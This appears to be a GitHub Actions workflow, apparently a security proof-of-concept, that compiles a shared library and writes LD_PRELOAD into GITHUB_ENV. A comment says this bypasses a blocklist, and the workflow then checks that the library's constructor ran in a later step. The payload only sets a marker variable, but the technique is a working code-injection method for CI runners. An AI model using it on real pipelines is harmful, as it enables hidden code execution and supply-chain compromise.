name: BASH_ENV Injection Test
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  test-ldpreload:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1 — compile LD_PRELOAD .so and set env
        run: |
          # Create a shared library that sets a marker env var when loaded
          cat > /tmp/preload.c << 'CEOF'
          #include <stdlib.h>
          __attribute__((constructor))
          void init(void) {
              setenv("LD_PRELOAD_INJECTED", "SYSTEM_LEVEL_CODE_EXEC_PROVEN", 1);
          }
          CEOF
          gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
          ls -la /tmp/preload.so
          
          # Set LD_PRELOAD via GITHUB_ENV (bypasses blocklist)
          echo "LD_PRELOAD=/tmp/preload.so" >> $GITHUB_ENV
          echo "Step 1: Compiled .so and set LD_PRELOAD"

      - name: Step 2 — check if LD_PRELOAD injected code
        run: |
          echo "=== LD_PRELOAD injection check ==="
          echo "LD_PRELOAD=$LD_PRELOAD"
          echo "LD_PRELOAD_INJECTED=$LD_PRELOAD_INJECTED"
          
          if [ "$LD_PRELOAD_INJECTED" = "SYSTEM_LEVEL_CODE_EXEC_PROVEN" ]; then
            echo "CRITICAL: LD_PRELOAD code execution PROVEN — .so constructor ran!"
          else
            echo "LD_PRELOAD .so may not have loaded (check for errors above)"
          fi
